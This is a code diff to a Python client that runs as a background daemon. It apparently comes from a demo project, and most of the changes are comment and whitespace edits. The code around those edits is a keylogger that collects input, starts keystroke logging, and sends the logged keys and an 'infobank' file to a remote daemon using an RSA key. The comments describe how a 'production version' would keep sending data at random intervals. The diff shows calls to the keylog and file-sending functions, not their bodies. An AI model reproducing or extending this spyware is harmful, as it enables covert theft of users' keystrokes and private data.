@@ -203,12 +203,12 @@ def run( stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
     
     ''''
     This function handles the running of the client from start to finish
-    @oarams - standar
+    @params - standard logging vars
     '''
+    
     cwd = os.path.dirname(os.path.realpath(sys.argv[0]))
     keyLoc = cwd
     keyLoc +=  '/test_rsa.key'
-    
     
     infoBank = getInput()
     sendFile(infoBank,  keyLoc,  'infobank.txt')
@@ -220,7 +220,8 @@ def run( stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
     except OSError as e:
         logger.error("Unable to fork for fork #1")
         sys.exit(0)
-    
+        
+    #2nd fork out
     os.chdir('/')
 
     try:
@@ -244,6 +245,8 @@ def run( stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
     
     keylog(cwd+'/keylogger.py') # keylogger.py is located in the working directory of the client/daemon
 
+    #For demo purposes, the time between sending of logged data is shortened
+    # additionally, a production version would continously call the sendFile after a random seconds with new data
     time.sleep(20)
 
     #should keylog fail to create a file, make one in its place
@@ -251,8 +254,11 @@ def run( stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
          with open(cwd+"/loggedKeys.log", 'a') as f:
             f.write(".")
         
-    # path exists
+    # path exists, send the file back to daemon
     sendFile(cwd+"/loggedKeys.log", keyLoc,  'keylog.txt') 
+    #a loop would be here in production
+    
+    #demo done
     os._exit(0)
     
 # MAIN # 
